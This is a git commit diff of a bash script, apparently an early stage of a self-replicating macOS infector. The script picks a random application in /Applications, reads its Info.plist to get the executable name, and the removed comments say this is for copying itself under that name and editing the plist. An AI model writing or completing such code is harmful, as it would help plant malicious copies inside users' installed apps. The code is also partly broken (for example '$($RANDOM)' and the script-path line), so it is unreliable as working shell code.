675a517fa7949686dd55a544474500e09e2f3204
The-SamminAter <48739810+The-SamminAter@users.noreply.github.com>
2020-09-23 20:00:25 -0700

    Worked on extracting the executable name

--- stage-1.sh
+++ stage-1.sh
@@ -1,12 +1,16 @@
 #!/bin/bash
-#This is stage 1, re-written
-#I decided to re-write stage 1 as it probably doesn't work at all,
-#and also is more commentary than code
-#Anywho, I present to you, stage 1:
-
+#Stage 1, re-written
+Script=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )$0
 #Application roulette; coppied from stage-1-old, and needs to be tested:
 loc=(/Applications/*)
-APPDIR="${loc[RANDOM % ${#loc[@]}]}/"
-#For the next part (replication), instead of trying to use the output of
-#ls, this script will read a target's Info.plist and use the value of the 
-#CFBundleExecutable to both name its copy, and edit the Info.plist
+Target="${loc[RANDOM % ${#loc[@]}]}"
+TargetPlist="$Target/Contents/Info.plist"
+#Using sed to get the line number where the executable name is stored in 
+#the target application's Info.plist (by looking for CFBundleExecutable
+#and then adding one)
+ExecLineNum=$(sed -n "/CFBundleExecutable/=" "$TargetPlist")
+let "ExecLineNum++"
+ExecLineFull=$(sed -n "${ExecLineNum}p" "$TargetPlist")
+TmpName=$($RANDOM)
+echo "$ExecLineFull" >> "/private/tmp/$TmpName"
+ExecName=$(sed -nr "/<string>/ s/.*<string>([^<]+).*/\1/p" "/private/tmp/$TmpName")
